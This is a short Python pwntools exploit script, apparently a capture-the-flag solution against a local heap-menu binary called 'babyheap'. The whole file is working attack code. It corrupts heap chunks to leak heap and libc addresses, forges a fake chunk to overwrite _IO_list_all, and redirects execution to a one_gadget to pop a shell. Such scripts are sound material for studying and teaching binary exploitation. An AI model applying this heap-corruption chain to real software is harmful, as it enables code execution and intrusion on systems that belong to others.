from pwn import *
import time
context(log_level='debug')
elf = ELF('./babyheap')
p = process(elf.path)
print proc.pidof(p)[0]
raw_input()

def func(num,index,content=''):
	p.sendlineafter('Choice:',str(num))
	p.sendlineafter('Index:',str(index))
	if num<3:
		p.sendlineafter('Content:',content)

func(1,0,'a')
func(1,1,p64(0)+p64(0x31))
func(1,2,'a')
func(1,3,'a')
func(1,4,'a')
func(1,5,p64(0x602060))

func(4,1)
func(4,0)
func(3,0)
heap_addr = u64(p.recvuntil('\n')[:-1].ljust(8,'\x00')) - 0x30
print hex(heap_addr)
func(2,0,p64(heap_addr+0x40))
func(1,9,'a')
func(1,8,p64(0)*3+'\x91')
func(1,6,p64(0)+p64(heap_addr+0x70))
func(4,2)
func(3,2)
libc_addr = u64(p.recvuntil('\n')[:-1].ljust(8,'\x00')) - 0x3c4b78
print hex(libc_addr)
func(2,8,p64(0)*2+'sh\0\0\0\0\0\0'+'\x61')
io_list_all = libc_addr + 0x3c5520
one_gadget = libc_addr + 0x45390
func(2,2,p64(0)+p64(io_list_all-0x10)+p64(0)+p64(one_gadget)[:-1])
p.sendlineafter('Choice:','1')
p.sendlineafter('Index:','7')
p.interactive()
